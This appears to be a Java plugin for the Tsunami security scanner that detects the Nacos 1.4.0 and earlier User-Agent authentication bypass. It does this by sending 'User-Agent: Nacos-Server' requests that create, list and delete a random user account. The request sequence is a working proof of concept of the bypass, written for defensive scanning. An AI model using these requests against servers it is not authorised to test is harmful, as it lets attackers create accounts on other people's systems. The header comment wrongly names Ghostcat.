package com.google.tsunami.plugins.detectors.nacos.auth_bypass_lte140;

/**
 * A {@link VulnDetector} that detects the Ghostcat vulnerability.
 */

import com.google.common.collect.ImmutableList;
import com.google.common.flogger.GoogleLogger;
import com.google.inject.Inject;
import com.google.protobuf.util.Timestamps;
import com.google.tsunami.common.data.NetworkServiceUtils;
import com.google.tsunami.common.net.http.HttpClient;
import com.google.tsunami.common.net.http.HttpHeaders;
import com.google.tsunami.common.net.http.HttpResponse;
import com.google.tsunami.common.net.http.HttpStatus;
import com.google.tsunami.common.time.UtcClock;
import com.google.tsunami.plugin.PluginType;
import com.google.tsunami.plugin.VulnDetector;
import com.google.tsunami.plugin.annotations.PluginInfo;
import com.google.tsunami.proto.*;

import java.io.IOException;
import java.time.Clock;
import java.time.Instant;
import java.util.Random;

import static com.google.common.base.Preconditions.checkNotNull;
import static com.google.common.collect.ImmutableList.toImmutableList;
import static com.google.tsunami.common.net.http.HttpRequest.*;

@PluginInfo(
    type = PluginType.VULN_DETECTION,
    name = "NacosAuthBypassVulnDetector",
    version = "1.0",
    description = "This detector checks for Alibaba-Nacos <= 1.4.0 User-Agent authentication bypass vulnerability.",
    author = "threedr3am (threedr3am@foxmail.com)",
    bootstrapModule = NacosAuthBypassVulnDetectorBootstrapModule.class
)
public class NacosAuthBypassVulnDetector implements VulnDetector {

  private static final GoogleLogger logger = GoogleLogger.forEnclosingClass();

  private final Clock utcClock;
  private final HttpClient httpClient;

  @Inject
  NacosAuthBypassVulnDetector(@UtcClock Clock utcClock, HttpClient httpClient) {
    this.utcClock = checkNotNull(utcClock);
    this.httpClient = checkNotNull(httpClient);
  }

  @Override
  public DetectionReportList detect(
      TargetInfo targetInfo, ImmutableList<NetworkService> matchedServices) {
    return DetectionReportList.newBuilder()
        .addAllDetectionReports(
            matchedServices.stream()
                .filter(NetworkServiceUtils::isWebService)
                .filter(this::isServiceVulnerable)
                .map(networkService -> buildDetectionReport(targetInfo, networkService))
                .collect(toImmutableList()))
        .build();
  }

  private boolean isServiceVulnerable(NetworkService networkService) {
    int num = new Random().nextInt(Integer.MAX_VALUE);
    String username = "user_" + num;
    String password = "pass_" + num;

    HttpHeaders httpHeaders = HttpHeaders.builder()
        .addHeader("User-Agent", "Nacos-Server")
        .build();

    // 1. create random user
    String targetUri = NetworkServiceUtils.buildWebApplicationRootUrl(networkService)
        + String.format("nacos/v1/auth/users?username=%s&password=%s", username, password);
    try {
      HttpResponse response = httpClient.send(post(targetUri).setHeaders(httpHeaders).build(),
          networkService);
      try {
        if (response.status() != HttpStatus.OK || !response.bodyString().isPresent()) {
          return false;
        }
        if (!response.bodyString().get().contains("create user ok!")) {
          return false;
        }
      } catch (Throwable t) {
        logger.atInfo().log("Failed to parse cores response json");
      }
    } catch (IOException e) {
      logger.atWarning().withCause(e).log("Unable to query '%s'.", targetUri);
    }

    // 2. check user exist
    String targetUri2 = NetworkServiceUtils.buildWebApplicationRootUrl(networkService)
        + "nacos/v1/auth/users?pageNo=1&pageSize=999";
    try {
      HttpResponse response = httpClient.send(get(targetUri2).setHeaders(httpHeaders).build(),
          networkService);
      try {
        if (response.status() != HttpStatus.OK || !response.bodyString().isPresent()) {
          return false;
        }
        if (!response.bodyString().get().contains(username)) {
          return false;
        }
      } catch (Throwable t) {
        logger.atInfo().log("Failed to parse cores response json");
      }
    } catch (IOException e) {
      logger.atWarning().withCause(e).log("Unable to query '%s'.", targetUri);
    }

    // 3. recover
    String targetUri3 = NetworkServiceUtils.buildWebApplicationRootUrl(networkService)
        + String.format("nacos/v1/auth/users?username=%s", username);
    try {
      HttpResponse response = httpClient.send(delete(targetUri3).setHeaders(httpHeaders).build(),
          networkService);
      try {
        if (response.status() != HttpStatus.OK || !response.bodyString().isPresent()) {
          return false;
        }
        if (response.bodyString().get().contains("delete user ok!")) {
          return true;
        }
      } catch (Throwable t) {
        logger.atInfo().log("Failed to parse cores response json");
      }
    } catch (IOException e) {
      logger.atWarning().withCause(e).log("Unable to query '%s'.", targetUri);
    }
    return false;
  }

  public DetectionReport buildDetectionReport(
      TargetInfo targetInfo, NetworkService vulnerableNetworkService) {
    return DetectionReport.newBuilder()
        .setTargetInfo(targetInfo)
        .setNetworkService(vulnerableNetworkService)
        .setDetectionTimestamp(Timestamps.fromMillis(Instant.now(utcClock).toEpochMilli()))
        .setDetectionStatus(DetectionStatus.VULNERABILITY_VERIFIED)
        .setVulnerability(
            Vulnerability.newBuilder()
                .setMainId(
                    VulnerabilityId.newBuilder().setPublisher("threedr3am")
                        .setValue("NACOS-ISSUE #4593"))
                .setSeverity(Severity.CRITICAL)
                .setTitle("Alibaba-Nacos User-Agent authentication bypass vulnerability")
                .setDescription(
                    "This detector checks for Alibaba-Nacos <= 1.4.0 User-Agent authentication bypass vulnerability."
                        + "When the nacos version is less than or equal to 1.4.0, when accessing the http endpoint, "
                        + "adding the User-Agent: Nacos-Server header can bypass the authentication restriction and access any http endpoint."
                        + "https://github.com/alibaba/nacos/issues/4593")
        )
        .build();
  }
}
